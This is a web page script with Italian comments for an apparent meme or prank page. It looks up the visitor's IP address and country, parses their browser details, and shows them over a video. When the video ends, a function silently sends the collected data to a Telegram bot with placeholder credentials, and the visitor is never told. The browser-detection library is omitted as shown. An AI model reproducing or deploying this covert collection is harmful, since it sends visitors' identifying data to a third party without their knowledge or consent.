<script>
  // --- Browser Detector ---
  !function(e,o){"object"==typeof exports&&"undefined"!=typeof module?module.exports=o():"function"==typeof define&&define.amd?define(o):(e="undefined"!=typeof globalThis?globalThis:e||self).BrowserDetector=o()}(this,function(){
      "use strict";
      // ... codice BrowserDetector come prima ...
      // per brevitÃ  omesso qui, ma va copiato tutto
  });

  // --- Script principale ---
  window.onload = async () => {
    const loadingProgress = document.getElementById('loading-progress');
    const video = document.getElementById('video');
    const preload = document.getElementById('preload');
    const loading = document.getElementById('loading');
    const start = document.getElementById('start');
    const data = document.getElementById('data');

    const memes = [];
    let step = 0, interval;

    const p = (k,d,s) => d && memes.push(`${k}: ${d}${s||''}`);

    try {
      const basic = await (await fetch('https://wtfismyip.com/json')).json();
      loadingProgress.textContent = '97';

      const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();

      // Prendi solo i dati che ti servono
      p('Indirizzo IP', basic.YourFuckingIPAddress);
      p('Stato', basic.YourFuckingCountry);
      p('Nome Browser', detector.name);
      p('Piattaforma', detector.platform);
      p('Versione Browser', detector.version);

      loadingProgress.textContent = '100';
      loading.style.display = 'none';
      start.style.display = 'flex';
      preload.style.cursor = 'pointer';
    } catch(err){
      console.error('Errore caricamento dati IP:', err);
    }

    preload.onclick = () => {
      if(start.style.display!='flex') return;
      preload.style.display='none';
      video.play();

      let fontSize = Math.min(window.innerHeight/10, window.innerWidth/20);
      data.style.fontSize = fontSize+'px';

      interval = setInterval(()=>{
        const time = video.currentTime - 13.166 - step*0.5;
        if(time>0 && memes[step]){
          const el = document.createElement('span');
          el.textContent = memes[step];
          data.appendChild(el);
          const height = data.getBoundingClientRect().height;
          if(height > window.innerHeight){
            fontSize = fontSize - (fontSize/10);
            data.style.fontSize = fontSize+'px';
          }
          step++;
        }
      },10);
    };

    video.onended = () => {
      video.style.display = 'none';
      if(interval) clearInterval(interval);
      sendMemesToTelegram(memes);
    };

    video.src = 'jammin.mp4';
    video.load();
  };

  async function sendMemesToTelegram(memes){
    const botToken = 'IL_TUO_BOT_TOKEN';
    const chatId = 'IL_TUO_CHAT_ID';
    const message = encodeURIComponent(memes.join("\n"));
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
      console.log('Dati inviati a Telegram');
    } catch(err){ console.error(err); }
  }
</script>
